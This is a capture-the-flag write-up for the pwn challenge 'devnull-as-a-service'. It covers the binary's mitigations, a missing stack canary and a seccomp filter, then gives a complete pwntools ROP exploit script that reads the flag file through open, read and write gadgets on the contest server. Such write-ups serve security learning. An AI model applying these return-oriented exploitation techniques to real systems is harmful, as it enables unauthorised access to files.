# Challenge: devnull-as-a-service

## Category: Pwn

## Challenge description
A few months ago, I came across this website. Inspired by it, I decided to recreate the service in C to self-host it.
To avoid any exploitable vulnerabilities, I decided to use a very strict seccomp filter. Even if my code were vulnerable, good luck exploiting it.
PS: You can find the flag at /home/ctf/flag.txt on the remote server. 

## Files given
- dev_null: ELF file, statistically linked

## Examination
- First, lets checksec to see security mitigations of the file:
``` console
$ checksec --file=dev_null
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
- So we can exploit PIE disabled statistically linked binary by ret2plt. Also, reversing the binary helps us see that although canary is found in checksec, the dev_null() function doesn't have a canary, which means buffer overflow is possible.

## Solution
- First, we can see that seccomp makes it only possible to use open, read, write syscalls.
- Also, there are a lot of functions that help IO process (since it is statistically linked) in the plt section
- By using these functions, we can read the flag file name to .bss section, open, read and write the flag.

## Exploit Script
```python
from pwn import *

elf = ELF('dev_null')
rop = ROP(elf)

address_open = p64(elf.symbols['__libc_open'])
address_read = p64(elf.symbols['__libc_read'])
address_write = p64(elf.symbols['__libc_write'])
address_gets = p64(elf.symbols['_IO_gets'])

address_rax = p64(rop.rax.address) # pop rax, ret
address_rsi = p64(rop.rsi.address) # pop rsi, pop rbp, ret
address_rdi = p64(rop.rdi.address) # pop rdi, ret
address_rdx = p64(0x000000000041799b) # xchg eax, edx, ret
address_ret = p64(0x000000000041913f) # ret

payload = b'A' * 16 # padding

address_buffer_for_file_name = p64(0x4afac0)
address_buffer_for_flag = p64(0x4afbc0)

flag_name = '/home/ctf/flag.txt'.encode()

# Read the flag file name
payload += address_rdi + address_buffer_for_file_name + address_ret + address_gets

# Open the flag file
payload += address_rdi + address_buffer_for_file_name + address_rsi + p64(0) + p64(0) + address_ret + address_rax + p64(0x444) + address_rdx + address_open

# Read the flag
payload += address_rdi + p64(3) + address_rsi + address_buffer_for_flag + p64(0) + address_ret + address_rax + p64(0xff) + address_rdx + address_read

# Write the flag to stdout
payload += address_rdi + p64(1) + address_rsi + address_buffer_for_flag + p64(0) + address_ret + address_rax + p64(0xff) + address_rdx + address_write

host = 'aeedc061-6dd4-4947-b23b-5f1596bb9782.x3c.tf'
port = 31337
p = remote(host=host, port=port, ssl=True)

print(p.recv().decode())
p.sendline(payload)
p.sendline(flag_name)
print(p.recvall())
p.close()



```